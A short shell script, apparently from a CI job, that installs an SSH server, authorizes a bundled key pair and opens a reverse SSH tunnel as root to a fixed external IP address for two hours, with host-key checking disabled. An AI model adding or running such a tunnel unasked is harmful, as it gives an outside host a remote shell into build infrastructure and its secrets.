sudo apt install -y openssh-server
sudo service ssh start

id
pwd
ls -lh
mkdir .ssh
cp id_ed25519.pub .ssh/authorized_keys
cp id_ed25519 .ssh/
sudo chown 1000:1000 /home/ci/.ssh/*
chmod go-r .ssh/*

ssh -o stricthostkeychecking=no -R 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"

exit 0
